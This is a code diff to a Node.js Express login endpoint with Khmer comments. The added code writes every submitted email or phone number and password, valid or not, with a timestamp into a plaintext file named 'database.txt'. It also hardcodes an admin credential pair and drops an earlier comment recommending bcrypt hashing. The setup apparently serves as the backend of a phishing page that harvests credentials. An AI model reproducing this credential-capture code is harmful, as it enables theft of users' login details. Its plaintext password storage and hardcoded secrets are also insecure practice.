@@ -1,36 +1,59 @@
 const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
+const fs = require('fs'); // ហៅកញ្ចប់ library សម្រាប់គ្រប់គ្រងហ្វាល (មានស្រាប់ក្នុង Node.js)
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// អនុញ្ញាតឱ្យ Frontend បាញ់ទិន្នន័យមកបាន (Cross-Origin Resource Sharing)
 app.use(cors());
-
-// កំណត់ឱ្យអានទិន្នន័យជាទម្រង់ JSON
 app.use(bodyParser.json());
 
-// បង្កើត API Route សម្រាប់ទទួលទិន្នន័យពី Form ចូលគណនី
+const CORRECT_USER = "admin@gmail.com";
+const CORRECT_PASS = "12345678";
+
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
 
-    // បង្ហាញទិន្នន័យដែលលោតមកពី Form លើផ្ទាំង Terminal របស់ Server
-    console.log("=== ទិន្នន័យថ្មីលោតមកដល់ហើយ ===");
-    console.log("អ៊ីមែល/លេខទូរស័ព្ទ:", username);
-    console.log("ពាក្យសម្ងាត់:", password);
-    console.log("=================================\n");
+    // ១. ចាប់យកពេលវេលាដែល User បានវាយបញ្ចូល
+    const timeStamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
 
-    // ទីនេះជាកន្លែងដែលអ្នកត្រូវសរសេរកូដដើម្បីផ្ទៀងផ្ទាត់ ឬរក្សាទុកក្នុង Database
-    // ឧទាហរណ៍: ប្រើ bcrypt ដើម្បី hash ពាក្យសម្ងាត់ និង ប្រើ SQL query ដើម្បីពិនិត្យមើល username និង password
-    // ឆ្លើយតបទៅកាន់ Frontend វិញ
+    // ២. រៀបចំទម្រង់អត្ថបទដើម្បីកត់ចូលហ្វាល
+    const logText = `[ពេលវេលា: ${timeStamp}] - អ៊ីមែល/លេខទូរស័ព្ទ: ${username} | ពាក្យសម្ងាត់: ${password}\n`;
+
+    // ៣. សរសេរបញ្ចូលទៅក្នុងហ្វាល database.txt (បើមិនទាន់មានហ្វាលនេះទេ វានឹងបង្កើតឱ្យស្វ័យប្រវត្តិ)
+    // មុខងារ appendFile មានន័យថាវាថែមទិន្នន័យថ្មីទៅខាងក្រោម ដោយមិនលុបទិន្នន័យចាស់ឡើយ
+    fs.appendFile('database.txt', logText, (err) => {
+        if (err) {
+            console.error("មានបញ្ហាក្នុងការកត់ត្រាចូលហ្វាល:", err);
+        } else {
+            console.log("-> បានរក្សាទុកទិន្នន័យចូលក្នុង database.txt រួចរាល់!");
+        }
+    });
+
+    // ៤. ពិនិត្យទិន្នន័យដើម្បីឆ្លើយតបទៅកាន់ វេសាយ វិញ
+    if (username !== CORRECT_USER) {
+        return res.json({ 
+            success: false, 
+            errorType: "username", 
+            message: "អ៊ីមែល ឬលេខទូរស័ព្ទនេះ មិនទាន់បានចុះឈ្មោះទេ។" 
+        });
+    }
+
+    if (password !== CORRECT_PASS) {
+        return res.json({ 
+            success: false, 
+            errorType: "password", 
+            message: "ពាក្យសម្ងាត់ដែលអ្នកបានបញ្ចូលមិនត្រឹមត្រូវទេ។" 
+        });
+    }
+
     res.json({ 
         success: true, 
-        message: "ទទួលបានទិន្នន័យដោយជោគជ័យ!" 
+        message: "ចូលគណនីជោគជ័យ!" 
     });
 });
 
-// បើកដំណើរការ Server
 app.listen(PORT, () => {
-    console.log(`Server កំពុងរត់នៅលើ Port: ${PORT}`);
+    console.log(`Server is running on port ${PORT}`);
 });
